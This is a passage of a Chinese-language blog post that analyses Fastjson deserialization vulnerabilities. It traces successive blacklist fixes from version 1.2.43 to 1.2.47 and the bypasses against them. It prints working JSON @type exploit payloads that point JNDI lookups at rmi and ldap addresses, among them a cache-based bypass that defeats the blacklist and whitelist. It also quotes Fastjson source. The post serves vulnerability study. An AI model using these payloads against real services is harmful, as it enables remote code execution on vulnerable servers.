+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//L开头以及;结尾的class将被去除头尾部分进行加载</span></span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以POC是，不过实际验证无法成功：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;@type&#39;: &#39;[com.sun.rowset.JdbcRowSetImpl&#39;,</span><br><span class="line">    &#39;dataSourceName&#39;: &#39;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&#39;,</span><br><span class="line">    &#39;autoCommit&#39;: &#39;true&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过2："><a href="#绕过2：" class="headerlink" title="绕过2："></a>绕过2：</h3><p>使用新的类进行绕过，类名为<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>，同样是实现一个RMI，进行远程类的加载，POC是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">    &quot;properties&quot;:&#123;</span><br><span class="line">        &quot;data_source&quot;:&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>原理和过程和12.2.24是一样的，这里不再重复了。</p>
+<h2 id="1-2-45修复"><a href="#1-2-45修复" class="headerlink" title="1.2.45修复"></a>1.2.45修复</h2><p>补充黑名单</p>
+<h2 id="1-2-45绕过-通杀POC"><a href="#1-2-45绕过-通杀POC" class="headerlink" title="1.2.45绕过-通杀POC"></a>1.2.45绕过-通杀POC</h2><p>前面说到的绕过方式都是基于手动配置关闭白名单的前提下绕过黑名单，而这次漏洞直接导致黑白名单不生效，可以说影响比之前那些大太多了，先看POC，再讲原理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里用的仍然是<code>JdbcRowSetImpl</code>不过它和它的参数们被放到了不同的地方，我们来看看这个payload是如果起作用的。</p>
+<p>一开始反序列化的是java.lang.Class这个类，调试跟进可以看到是从checkAutoType这一段代码中获取到的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">        &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">        &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个deserializers在一开始会对其中放入许多常用的类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initDeserializers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ... <span class="comment">// 太多了，就不贴了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在紧跟的代码中就直接返回了，还没到原本autoTypeSupport的判断。猜测本意是让Fastjson可以任意序列化一些基础的类。然后通过java.lang.Class获取到了com.sun.rowset.JdbcRowSetImpl类，然后重点来了。</p>
+<p>在loadClass中，可以看到假如cache为true，就会把获取到的类缓存到mapping中（应该是为了提高效率）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">    <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然而这个cache在传入的时候默认就是true</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是，触发到第二段payload的时候，在checkAutoType函数中，就直接从缓存中获取到了com.sun.rowset.JdbcRowSetImpl这个类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">        &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">        &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br></pre></td></tr></table></figure>
+<p>然后也是一样在还没有判断黑名单和com.sun.rowset.JdbcRowSetImpl的验证之前就return了。</p>
+<h2 id="1-2-47修复"><a href="#1-2-47修复" class="headerlink" title="1.2.47修复"></a>1.2.47修复</h2><p>将之前的loadClass中默认cache设置成了false。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以在第一次获取到com.sun.rowset.JdbcRowSetImpl这个类之后就不会缓存，到第二次的payload时也就取不到缓存的类，也就会进入到黑名单和com.sun.rowset.JdbcRowSetImpl的验证中了。</p>
+<h2 id="1-2-47绕过"><a href="#1-2-47绕过" class="headerlink" title="1.2.47绕过"></a>1.2.47绕过</h2><p>新的gadget，原理和之前的相同，下面直接给出gadget和poc：</p>
+<ol>
+<li><p>org.apache.shiro.jndi.JndiObjectFactory</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Calc&quot;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>br.com.anteros.dbcp.AnterosDBCPConfig</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Calc&quot;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Calc&quot;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,</span><br><span class="line">    &quot;properties&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Calc&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="1-2-6修复"><a href="#1-2-6修复" class="headerlink" title="1.2.6修复"></a>1.2.6修复</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></li>
+<li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></li>
+<li><a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrchang/p/6789060.html</a></li>
+</ol>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-2-25版本修复"><span class="toc-number">2.</span> <span class="toc-text">12.2.25版本修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-1-2-41绕过"><span class="toc-number">3.</span> <span class="toc-text">1.2.25-1.2.41绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-42修复"><span class="toc-number">4.</span> <span class="toc-text">1.2.42修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-42绕过"><span class="toc-number">5.</span> <span class="toc-text">1.2.42绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-43修复"><span class="toc-number">6.</span> <span class="toc-text">1.2.43修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-43绕过"><span class="toc-number">7.</span> <span class="toc-text">1.2.43绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过1："><span class="toc-number">7.1.</span> <span class="toc-text">绕过1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过2："><span class="toc-number">7.2.</span> <span class="toc-text">绕过2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-45修复"><span class="toc-number">8.</span> <span class="toc-text">1.2.45修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-45绕过-通杀POC"><span class="toc-number">9.</span> <span class="toc-text">1.2.45绕过-通杀POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-47修复"><span class="toc-number">10.</span> <span class="toc-text">1.2.47修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-47绕过"><span class="toc-number">11.</span> <span class="toc-text">1.2.47绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-6修复"><span class="toc-number">12.</span> <span class="toc-text">1.2.6修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">13.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&text=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&is_video=false&description=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson/fastjson反序列化的防御和绕过&body=Check out this article: http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&name=fastjson/fastjson反序列化的防御和绕过&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Homer
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Google Analytics -->
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
